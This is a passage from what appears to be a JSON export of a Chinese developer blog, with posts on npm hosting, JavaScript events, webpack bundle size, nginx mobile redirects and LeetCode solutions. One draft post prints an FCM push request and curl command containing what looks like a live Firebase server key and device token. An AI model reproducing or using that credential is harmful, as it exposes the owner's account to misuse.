\n等命令sinopia搭建的npm库都是支持的。\n\n如下是Sinopia搭建npm库的首页。publish了一个库测试了下。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-27T07:54:23.000Z","created_by":"1","updated_at":"2017-10-24T02:36:27.000Z","updated_by":"1","published_at":"2017-09-27T07:57:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33e","uuid":"6306f0b8-0db5-41a6-814e-acdbcbc764eb","title":"js笔记4","slug":"domshi-jian-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"focus, blur不支持事件冒泡，支持事件捕获。使用focusin，focusout代替。\\n```\\nconst events = {\\n    focus: 'focusin',\\n    blur: 'focusout'\\n};\\n```\\n\\nconsole.log打印的对象是不会被垃圾回收器回收的。因此最好不要在页面中console.log任何大对象，这样可能会影响页面的整体性能，特别在生产环境中。除了console.log外，另外还有console.dir、console.error、console.warn等都存在类似的问题，这些细节需要特别的关注。\\n\\n![](/content/images/2018/03/z-index.png)\\n\\n![](/content/images/2018/03/5AAyW.png)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>focus, blur不支持事件冒泡，支持事件捕获。使用focusin，focusout代替。</p>\n<pre><code>const events = {\n    focus: 'focusin',\n    blur: 'focusout'\n};\n</code></pre>\n<p>console.log打印的对象是不会被垃圾回收器回收的。因此最好不要在页面中console.log任何大对象，这样可能会影响页面的整体性能，特别在生产环境中。除了console.log外，另外还有console.dir、console.error、console.warn等都存在类似的问题，这些细节需要特别的关注。</p>\n<p><img src=\"/content/images/2018/03/z-index.png\" alt=\"\"></p>\n<p><img src=\"/content/images/2018/03/5AAyW.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"130","plaintext":"focus, blur不支持事件冒泡，支持事件捕获。使用focusin，focusout代替。\n\nconst events = {\n    focus: 'focusin',\n    blur: 'focusout'\n};\n\n\nconsole.log打印的对象是不会被垃圾回收器回收的。因此最好不要在页面中console.log任何大对象，这样可能会影响页面的整体性能，特别在生产环境中。除了console.log外，另外还有console.dir、console.error、console.warn等都存在类似的问题，这些细节需要特别的关注。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-11-27T09:57:04.000Z","created_by":"1","updated_at":"2018-03-01T07:11:38.000Z","updated_by":"1","published_at":"2017-12-06T03:07:40.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33f","uuid":"ca299824-33fd-4e4d-9c10-818a2f9563b8","title":"图片","slug":"tu-pian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nPOST /fcm/send HTTP/1.1\\nHost: fcm.googleapis.com\\nAuthorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4\\nContent-Type: application/json\\nCache-Control: no-cache\\nPostman-Token: 80274b88-74e1-8258-a8ee-3efd8a4b4784\\n\\n{\\\"notification\\\":{\\\"title\\\":\\\"Portugal vs. Denmark\\\",\\\"body\\\":\\\"5 to 1\\\",\\\"icon\\\":\\\"firebase-logo.png\\\",\\\"click_action\\\":\\\"http://localhost:8081\\\"},\\\"to\\\":\\\"eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk\\\"}\\n\\ncurl -X POST \\\\\\n  https://fcm.googleapis.com/fcm/send \\\\\\n  -H 'authorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4' \\\\\\n  -H 'cache-control: no-cache' \\\\\\n  -H 'content-type: application/json' \\\\\\n  -H 'host: fcm.googleapis.com' \\\\\\n  -H 'postman-token: e70ac670-6c17-30a2-57e4-71e14e90ab7f' \\\\\\n  -d '{\\\"notification\\\":{\\\"title\\\":\\\"Portugal vs. Denmark\\\",\\\"body\\\":\\\"5 to 1\\\",\\\"icon\\\":\\\"firebase-logo.png\\\",\\\"click_action\\\":\\\"http://localhost:8081\\\"},\\\"to\\\":\\\"eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk\\\"}'\\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>POST /fcm/send HTTP/1.1\nHost: fcm.googleapis.com\nAuthorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4\nContent-Type: application/json\nCache-Control: no-cache\nPostman-Token: 80274b88-74e1-8258-a8ee-3efd8a4b4784\n\n{&quot;notification&quot;:{&quot;title&quot;:&quot;Portugal vs. Denmark&quot;,&quot;body&quot;:&quot;5 to 1&quot;,&quot;icon&quot;:&quot;firebase-logo.png&quot;,&quot;click_action&quot;:&quot;http://localhost:8081&quot;},&quot;to&quot;:&quot;eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk&quot;}\n\ncurl -X POST \\\n  https://fcm.googleapis.com/fcm/send \\\n  -H 'authorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4' \\\n  -H 'cache-control: no-cache' \\\n  -H 'content-type: application/json' \\\n  -H 'host: fcm.googleapis.com' \\\n  -H 'postman-token: e70ac670-6c17-30a2-57e4-71e14e90ab7f' \\\n  -d '{&quot;notification&quot;:{&quot;title&quot;:&quot;Portugal vs. Denmark&quot;,&quot;body&quot;:&quot;5 to 1&quot;,&quot;icon&quot;:&quot;firebase-logo.png&quot;,&quot;click_action&quot;:&quot;http://localhost:8081&quot;},&quot;to&quot;:&quot;eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk&quot;}'\n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"131","plaintext":"POST /fcm/send HTTP/1.1\nHost: fcm.googleapis.com\nAuthorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4\nContent-Type: application/json\nCache-Control: no-cache\nPostman-Token: 80274b88-74e1-8258-a8ee-3efd8a4b4784\n\n{\"notification\":{\"title\":\"Portugal vs. Denmark\",\"body\":\"5 to 1\",\"icon\":\"firebase-logo.png\",\"click_action\":\"http://localhost:8081\"},\"to\":\"eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk\"}\n\ncurl -X POST \\\n  https://fcm.googleapis.com/fcm/send \\\n  -H 'authorization: key=AIzaSyDkIVA_9PZsG_SK9tl3gyserdetFMjlcm4' \\\n  -H 'cache-control: no-cache' \\\n  -H 'content-type: application/json' \\\n  -H 'host: fcm.googleapis.com' \\\n  -H 'postman-token: e70ac670-6c17-30a2-57e4-71e14e90ab7f' \\\n  -d '{\"notification\":{\"title\":\"Portugal vs. Denmark\",\"body\":\"5 to 1\",\"icon\":\"firebase-logo.png\",\"click_action\":\"http://localhost:8081\"},\"to\":\"eayRDEtsdrI:APA91bFCKZPadYZMkA4B7I8V13R6gUaRLOlo-TmoRX4YpsAC5tw9iTL9xy7owtRNbu46ix--_cLt58DFgcmCHm4NjeYZ_khDDwhS6UQ5qt72L41eJFINq52MDmRftk50kIHoYl-5TdMk\"}'","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-11-30T05:33:46.000Z","created_by":"1","updated_at":"2018-02-27T08:33:44.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d340","uuid":"37c0a61e-ae30-4fb7-8642-6fe318177931","title":"Angularx服务器渲染","slug":"angularxfu-wu-qi-xuan-ran","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"#### 一、vendor,polyfill打包\\n\\n使用vendor抽出公共部分，如`angular/*`、`rxjs`。这些基本上都不变。加上hash[8]\\n\\n#### 二、去掉不常用的库\\n\\n如momentjs我们只用format()的功能。但是它是很大500+kb。还有jquery只使用了$.param() 它也是200+kb。\\n\\n\\n#### 三、懒加载\\n\\n在经过一，二部后已经node_modules中出来jpush-ui外，基本没有了。没啥优化空间了。官网的页面是很多的，20多个页面。可以看到下图。这2.8M基本都是页面。\\n\\n\\n![image](/content/images/2017/11/webpack1.png)\\n\\n\\n|      | 大小              | 备注                                  |\\n| ---- | --------------- | ----------------------------------- |\\n| 1    | 5M+             | 第一次                                 |\\n| 2    | 3.6M(client.js) | dll打包，分成3个文件，client、vendor、polyfill |\\n| 3    | 3.1M(client.js) | 去掉momentjs库                         |\\n| 4    | 2.8M(client.js) | 去掉jquery库                       |\\n\\n\\n#### 工具\\n\\n这里使用`BundleAnalyzerPlugin`分析工具。\\n```\\n        new BundleAnalyzerPlugin({\\n            analyzerMode: 'server',\\n            analyzerHost: '127.0.0.1',\\n            analyzerPort: 8888,\\n            reportFilename: 'report.html',\\n            defaultSizes: 'parsed',\\n            openAnalyzer: true,\\n            generateStatsFile: false,\\n            statsFilename: 'stats.json',\\n            statsOptions: null,\\n            logLevel: 'info'\\n        })\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h4 id=\"vendorpolyfill\">一、vendor,polyfill打包</h4>\n<p>使用vendor抽出公共部分，如<code>angular/*</code>、<code>rxjs</code>。这些基本上都不变。加上hash[8]</p>\n<h4 id=\"\">二、去掉不常用的库</h4>\n<p>如momentjs我们只用format()的功能。但是它是很大500+kb。还有jquery只使用了$.param() 它也是200+kb。</p>\n<h4 id=\"\">三、懒加载</h4>\n<p>在经过一，二部后已经node_modules中出来jpush-ui外，基本没有了。没啥优化空间了。官网的页面是很多的，20多个页面。可以看到下图。这2.8M基本都是页面。</p>\n<p><img src=\"/content/images/2017/11/webpack1.png\" alt=\"image\"></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>大小</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>5M+</td>\n<td>第一次</td>\n</tr>\n<tr>\n<td>2</td>\n<td>3.6M(client.js)</td>\n<td>dll打包，分成3个文件，client、vendor、polyfill</td>\n</tr>\n<tr>\n<td>3</td>\n<td>3.1M(client.js)</td>\n<td>去掉momentjs库</td>\n</tr>\n<tr>\n<td>4</td>\n<td>2.8M(client.js)</td>\n<td>去掉jquery库</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"\">工具</h4>\n<p>这里使用<code>BundleAnalyzerPlugin</code>分析工具。</p>\n<pre><code>        new BundleAnalyzerPlugin({\n            analyzerMode: 'server',\n            analyzerHost: '127.0.0.1',\n            analyzerPort: 8888,\n            reportFilename: 'report.html',\n            defaultSizes: 'parsed',\n            openAnalyzer: true,\n            generateStatsFile: false,\n            statsFilename: 'stats.json',\n            statsOptions: null,\n            logLevel: 'info'\n        })\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"132","plaintext":"一、vendor,polyfill打包\n使用vendor抽出公共部分，如angular/*、rxjs。这些基本上都不变。加上hash[8]\n\n二、去掉不常用的库\n如momentjs我们只用format()的功能。但是它是很大500+kb。还有jquery只使用了$.param() 它也是200+kb。\n\n三、懒加载\n在经过一，二部后已经node_modules中出来jpush-ui外，基本没有了。没啥优化空间了。官网的页面是很多的，20多个页面。可以看到下图。这2.8M基本都是页面。\n\n\n\n大小备注15M+第一次23.6M(client.js)dll打包，分成3个文件，client、vendor、polyfill33.1M(client.js)\n去掉momentjs库42.8M(client.js)去掉jquery库工具\n这里使用BundleAnalyzerPlugin分析工具。\n\n        new BundleAnalyzerPlugin({\n            analyzerMode: 'server',\n            analyzerHost: '127.0.0.1',\n            analyzerPort: 8888,\n            reportFilename: 'report.html',\n            defaultSizes: 'parsed',\n            openAnalyzer: true,\n            generateStatsFile: false,\n            statsFilename: 'stats.json',\n            statsOptions: null,\n            logLevel: 'info'\n        })","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-12-11T06:37:08.000Z","created_by":"1","updated_at":"2018-02-09T07:14:37.000Z","updated_by":"1","published_at":"2017-12-11T06:37:13.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d341","uuid":"520a6168-199b-4bbf-8345-449a1d9cbfe7","title":"nginx配置判断UA跳转pc或mobile","slug":"nginxpei-zhi-pan-duan-uatiao-zhuan-pchuo-mobile","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\n# mobile的conf\\nserver {\\n        client_max_body_size 4G;\\n        listen  10080;  ## listen for ipv4; this line is default and implied\\n        server_name localhost;\\n        root /home/ldh/test/mobile;\\n        location / {\\n                autoindex on; #显示索引\\n                autoindex_exact_size on; #显示大小\\n                autoindex_localtime on;   #显示时间\\n        }\\n}\\n```\\n\\n```\\n# pc的conf\\nserver {\\n        client_max_body_size 4G;\\n        listen  10081;  # listen for ipv4; this line is default and implied\\n        server_name localhost;\\n        location / {\\n\\t\\troot /home/ldh/test/pc;\\n                autoindex on; #显示索引\\n                autoindex_exact_size on; #显示大小\\n                autoindex_localtime on;   #显示时间\\n        \\t\\tif ( $http_user_agent ~* \\\"(Android|iPhone|Windows|Phone|UC|iPad|iPod|Kindle)\\\" ){\\n        \\t\\t\\t# root /home/ldh/test/mobile;\\n        \\t\\t\\trewrite ^(.*) http://localhost:10080$uri;\\n        \\t\\t}\\n        }\\n \\n}\\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code># mobile的conf\nserver {\n        client_max_body_size 4G;\n        listen  10080;  ## listen for ipv4; this line is default and implied\n        server_name localhost;\n        root /home/ldh/test/mobile;\n        location / {\n                autoindex on; #显示索引\n                autoindex_exact_size on; #显示大小\n                autoindex_localtime on;   #显示时间\n        }\n}\n</code></pre>\n<pre><code># pc的conf\nserver {\n        client_max_body_size 4G;\n        listen  10081;  # listen for ipv4; this line is default and implied\n        server_name localhost;\n        location / {\n\t\troot /home/ldh/test/pc;\n                autoindex on; #显示索引\n                autoindex_exact_size on; #显示大小\n                autoindex_localtime on;   #显示时间\n        \t\tif ( $http_user_agent ~* &quot;(Android|iPhone|Windows|Phone|UC|iPad|iPod|Kindle)&quot; ){\n        \t\t\t# root /home/ldh/test/mobile;\n        \t\t\trewrite ^(.*) http://localhost:10080$uri;\n        \t\t}\n        }\n \n}\n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"133","plaintext":"# mobile的conf\nserver {\n        client_max_body_size 4G;\n        listen  10080;  ## listen for ipv4; this line is default and implied\n        server_name localhost;\n        root /home/ldh/test/mobile;\n        location / {\n                autoindex on; #显示索引\n                autoindex_exact_size on; #显示大小\n                autoindex_localtime on;   #显示时间\n        }\n}\n\n\n# pc的conf\nserver {\n        client_max_body_size 4G;\n        listen  10081;  # listen for ipv4; this line is default and implied\n        server_name localhost;\n        location / {\n\t\troot /home/ldh/test/pc;\n                autoindex on; #显示索引\n                autoindex_exact_size on; #显示大小\n                autoindex_localtime on;   #显示时间\n        \t\tif ( $http_user_agent ~* \"(Android|iPhone|Windows|Phone|UC|iPad|iPod|Kindle)\" ){\n        \t\t\t# root /home/ldh/test/mobile;\n        \t\t\trewrite ^(.*) http://localhost:10080$uri;\n        \t\t}\n        }\n \n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-12-11T06:37:32.000Z","created_by":"1","updated_at":"2017-12-11T06:37:44.000Z","updated_by":"1","published_at":"2017-12-11T06:37:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d342","uuid":"feb31c50-d6e4-4548-9e5c-17c1478cb154","title":"leetcode ---Word Break","slug":"leetcode-word-break","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 给定一个非空字符串，以及一个非空字典的列表，是否可以确定字符串可以分割成一个或多个字典里的单词，你可以确定字典中不包含重复单词。\\n\\n```\\n    var wordBreak = function (s, wordDict) {\\n        let result={};\\n        let obj = {};\\n        wordDict.forEach((x) => {\\n            obj[x] = x;\\n        })\\n        var run =function (s,obj) {\\n            if(s in result){return result[s];}\\n            let temp = '';\\n            let b = false;\\n            for (var i = 0; i < s.length; i++) {\\n                temp += s[i];\\n                if (obj[temp]) {\\n                    // console.log(1)\\n                    if (i === s.length - 1) {\\n                        return true;\\n                    }\\n                    b = b || run(s.slice(i + 1), obj)\\n                    if(b===true){break;}\\n                }\\n\\n            }\\n            result[s]=b;\\n            return b;\\n        }\\n        return run(s,obj);\\n    };\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>给定一个非空字符串，以及一个非空字典的列表，是否可以确定字符串可以分割成一个或多个字典里的单词，你可以确定字典中不包含重复单词。</p>\n</blockquote>\n<pre><code>    var wordBreak = function (s, wordDict) {\n        let result={};\n        let obj = {};\n        wordDict.forEach((x) =&gt; {\n            obj[x] = x;\n        })\n        var run =function (s,obj) {\n            if(s in result){return result[s];}\n            let temp = '';\n            let b = false;\n            for (var i = 0; i &lt; s.length; i++) {\n                temp += s[i];\n                if (obj[temp]) {\n                    // console.log(1)\n                    if (i === s.length - 1) {\n                        return true;\n                    }\n                    b = b || run(s.slice(i + 1), obj)\n                    if(b===true){break;}\n                }\n\n            }\n            result[s]=b;\n            return b;\n        }\n        return run(s,obj);\n    };\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"134","plaintext":"> 给定一个非空字符串，以及一个非空字典的列表，是否可以确定字符串可以分割成一个或多个字典里的单词，你可以确定字典中不包含重复单词。\n\n\n    var wordBreak = function (s, wordDict) {\n        let result={};\n        let obj = {};\n        wordDict.forEach((x) => {\n            obj[x] = x;\n        })\n        var run =function (s,obj) {\n            if(s in result){return result[s];}\n            let temp = '';\n            let b = false;\n            for (var i = 0; i < s.length; i++) {\n                temp += s[i];\n                if (obj[temp]) {\n                    // console.log(1)\n                    if (i === s.length - 1) {\n                        return true;\n                    }\n                    b = b || run(s.slice(i + 1), obj)\n                    if(b===true){break;}\n                }\n\n            }\n            result[s]=b;\n            return b;\n        }\n        return run(s,obj);\n    };","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-12-29T07:27:49.000Z","created_by":"1","updated_at":"2017-12-29T07:47:48.000Z","updated_by":"1","published_at":"2017-12-29T07:47:48.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d343","uuid":"ca480691-cdae-4b24-84d9-96676c408019","title":"leetcode ---Word Break2","slug":"leetcode-word-break2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Word Break的升级版，求出所有的组合。\\nTime Limit Exceeded\\n```\\n        var wordBreak = function (s, wordDict) {\\n            let result={};\\n            let obj = {};\\n            wordDict.forEach((x) => {\\n                obj[x] = x;\\n            })\\n            let vals=[];\\n            let arr = [];\\n            var run =function (s,obj) {\\n                // if(s in result){return result[s];}\\n                let temp = '';\\n\\n                for (var i = 0; i < s.length; i++) {\\n                    temp += s[i];\\n                    if (obj[temp]) {\\n                        // console.log(1)\\n                        arr.push(temp)\\n                        if (i === s.length - 1) {\\n                            vals.push(arr.join(' '));\\n                        }\\n\\n                        run(s.slice(i + 1), obj);\\n                        arr.pop();\\n\\n                    }\\n\\n                }\\n                // result[s]=res;\\n            }\\n            run(s,obj);\\n            return vals;\\n        };\\n```\\n不超时\\n```\\n        var wordBreak = function (s, wordDict) {\\n            let result = {};\\n            let obj = {};\\n            wordDict.forEach((x) => {\\n                obj[x] = x;\\n            })\\n            var out = function (s, obj) {\\n                if (s in result) { return result[s]; }\\n                let vals = [];\\n                let arr = [];\\n                var run = function (s, obj) {\\n\\n                    let temp = '';\\n\\n                    for (var i = 0; i < s.length; i++) {\\n                        temp += s[i];\\n                        if (obj[temp]) {\\n                            // console.log(1)\\n                            arr.push(temp)\\n                            if (i === s.length - 1) {\\n                                vals.push(arr);\\n                            } else {\\n                                let res = out(s.slice(i + 1), obj);\\n                                res.forEach((x) => {\\n                                    var tempArr = arr.concat(x);\\n                                    vals.push(tempArr);\\n                                    // arr.pop();\\n                                });\\n                                arr.pop();\\n                            }\\n                        }\\n\\n                    }\\n\\n                }\\n                run(s, obj);\\n                result[s] = vals;\\n                return vals;\\n            }\\n            return out(s, obj).map(x => x.join(' '));\\n            // run(s, obj);\\n            // return vals;\\n        };\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Word Break的升级版，求出所有的组合。<br>\nTime Limit Exceeded</p>\n<pre><code>        var wordBreak = function (s, wordDict) {\n            let result={};\n            let obj = {};\n            wordDict.forEach((x) =&gt; {\n                obj[x] = x;\n            })\n            let vals=[];\n            let arr = [];\n            var run =function (s,obj) {\n                // if(s in result){return result[s];}\n                let temp = '';\n\n                for (var i = 0; i &lt; s.length; i++) {\n                    temp += s[i];\n                    if (obj[temp]) {\n                        // console.log(1)\n                        arr.push(temp)\n                        if (i === s.length - 1) {\n                            vals.push(arr.join(' '));\n                        }\n\n                        run(s.slice(i + 1), obj);\n                        arr.pop();\n\n                    }\n\n                }\n                // result[s]=res;\n            }\n            run(s,obj);\n            return vals;\n        };\n</code></pre>\n<p>不超时</p>\n<pre><code>        var wordBreak = function (s, wordDict) {\n            let result = {};\n            let obj = {};\n            wordDict.forEach((x) =&gt; {\n                obj[x] = x;\n            })\n            var out = function (s, obj) {\n                if (s in result) { return result[s]; }\n                let vals = [];\n                let arr = [];\n                var run = function (s, obj) {\n\n                    let temp = '';\n\n                    for (var i = 0; i &lt; s.length; i++) {\n                        temp += s[i];\n                        if (obj[temp]) {\n                            // console.log(1)\n                            arr.push(temp)\n                            if (i === s.length - 1) {\n                                vals.push(arr);\n                            } else {\n                                let res = out(s.slice(i + 1), obj);\n                                res.forEach((x) =&gt; {\n                                    var tempArr = arr.concat(x);\n                                    vals.push(tempArr);\n                                    // arr.pop();\n                                });\n                                arr.pop();\n                            }\n                        }\n\n                    }\n\n                }\n                run(s, obj);\n                result[s] = vals;\n                return vals;\n            }\n            return out(s, obj).map(x =&gt; x.join(' '));\n            // run(s, obj);\n            // return vals;\n        };\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"135","plaintext":"Word Break的升级版，求出所有的组合。\nTime Limit Exceeded\n\n        var wordBreak = function (s, wordDict) {\n            let result={};\n            let obj = {};\n            wordDict.forEach((x) => {\n                obj[x] = x;\n            })\n            let vals=[];\n            let arr = [];\n            var run =function (s,obj) {\n                // if(s in result){return result[s];}\n                let temp = '';\n\n                for (var i = 0; i < s.length; i++) {\n                    temp += s[i];\n                    if (obj[temp]) {\n                        // console.log(1)\n                        arr.push(temp)\n                        if (i === s.length - 1) {\n                            vals.push(arr.join(' '));\n                        }\n\n                        run(s.slice(i + 1), obj);\n                        arr.pop();\n\n                    }\n\n                }\n                // result[s]=res;\n            }\n            run(s,obj);\n            return vals;\n        };\n\n\n不超时\n\n        var wordBreak = function (s, wordDict) {\n            let result = {};\n            let obj = {};\n            wordDict.forEach((x) => {\n                obj[x] = x;\n            })\n            var out = function (s, obj) {\n                if (s in result) { return result[s]; }\n                let vals = [];\n                let arr = [];\n                var run = function (s, obj) {\n\n                    let temp = '';\n\n                    for (var i = 0; i < s.length; i++) {\n                        temp += s[i];\n                        if (obj[temp]) {\n                            // console.log(1)\n                            arr.push(temp)\n                            if (i === s.length - 1) {\n                                vals.push(arr);\n                            } else {\n                                let res = out(s.slice(i + 1), obj);\n                                res.forEach((x) => {\n                                    var tempArr = arr.concat(x);\n                                    vals.push(tempArr);\n                                    // arr.pop();\n                                });\n                                arr.pop();\n                            }\n                        }\n\n                    }\n\n                }\n                run(s, obj);\n                result[s] = vals;\n                return vals;\n            }\n            return out(s, obj).map(x => x.join(' '));\n            // run(s, obj);\n            // return vals;\n        };","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-12-29T09:35:40.000Z","created_by":"1","updated_at":"2017-12-30T14:49:56.000Z","updated_by":"1","published_at":"2017-12-30T14:49:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d344","uuid":"6e498be5-265d-4ba3-9816-7c07cde143e3","title":"leetcode--Non-negative Integers without Consecutive Ones","slug":"leetcode-non-negative-integers-without-consecutive-ones","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这道题给了我们一个数字，让我们求不大于这个数字的所有数字中，其二进制的表示形式中没有连续1的个数。\\n这里可以先做个简单的题目，长度为n的二进制的表示形式中没有连续1的个数。\\n```\\n输入：N = 1\\n输出：2\\n// 3个字符串是0,1  （1+1）\\n\\n输入：N = 2\\n输出：3\\n// 3个字符串是00,01,10 （2+1）\\n\\n输入：N = 3\\n输出：5\\n// 5个字符串是000,001,010,100,101 （3+2）\\n\\n输入：N = 4\\n输出：8\\n// 5个字符串是0000,0001,0010,0100,0101,1000,1001,1010 （5+3）\\n```\\n这个问题可以用动态规划来解决。假设a [i]是长度为i的二进制串的数目，它不包含任何两个连续的1并且以0结尾。同样，让b [i]是以1结尾的这样的串的数目。我们可以追加0或1到以0结尾的字符串，但是我们只能将0附加到以1结尾的字符串。这产生递归关系：\\n\\n如当k=5时，二进制数的范围是00000-11111，我们可以将其分为两个部分，00000-01111和10000-10111，因为任何大于11000的数字都是不成立的，因为有开头已经有了两个连续1。而我们发现其实00000-01111就是f(4)，而10000-10111就是f(3)，所以f(5) = f(4) + f(3)，这就是一个斐波那契数列啦.\\n```\\nvar findIntegers = function(num) {\\n    let numStr=Array.from(num.toString(2)).reverse().join('');\\n    let n=numStr.length;\\n    let a=[1];\\n    let b=[1];\\n    for(var i=1;i<n;i++){\\n        a[i]=a[i-1]+b[i-1];\\n        b[i]=a[i-1];\\n    }\\n    var res=a[n-1]+b[n-1];\\n    for(var i=n-2;i>=0;i--){\\n        if(numStr[i]==='1'&&numStr[i+1]==='1') break;\\n        if(numStr[i]==='0'&&numStr[i+1]==='0') res-=b[i];\\n    }\\n    return res;\\n};\\n```\\n* `if(numStr[i]==='1'&&numStr[i+1]==='1') break;`因为11xxxx内等于111111内，没有连续1的个数是一样的。\\n* '00'减去fn(i)的个数。100xxx不能大于101111，去到1111内没有连续1的个数即可。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>这道题给了我们一个数字，让我们求不大于这个数字的所有数字中，其二进制的表示形式中没有连续1的个数。<br>\n这里可以先做个简单的题目，长度为n的二进制的表示形式中没有连续1的个数。</p>\n<pre><code>输入：N = 1\n输出：2\n// 3个字符串是0,1  （1+1）\n\n输入：N = 2\n输出：3\n// 3个字符串是00,01,10 （2+1）\n\n输入：N = 3\n输出：5\n// 5个字符串是000,001,010,100,101 （3+2）\n\n输入：N = 4\n输出：8\n// 5个字符串是0000,0001,0010,0100,0101,1000,1001,1010 （5+3）\n</code></pre>\n<p>这个问题可以用动态规划来解决。假设a [i]是长度为i的二进制串的数目，它不包含任何两个连续的1并且以0结尾。同样，让b [i]是以1结尾的这样的串的数目。我们可以追加0或1到以0结尾的字符串，但是我们只能将0附加到以1结尾的字符串。这产生递归关系：</p>\n<p>如当k=5时，二进制数的范围是00000-11111，我们可以将其分为两个部分，00000-01111和10000-10111，因为任何大于11000的数字都是不成立的，因为有开头已经有了两个连续1。而我们发现其实00000-01111就是f(4)，而10000-10111就是f(3)，所以f(5) = f(4) + f(3)，这就是一个斐波那契数列啦.</p>\n<pre><code>var findIntegers = function(num) {\n    let numStr=Array.from(num.toString(2)).reverse().join('');\n    let n=numStr.length;\n    let 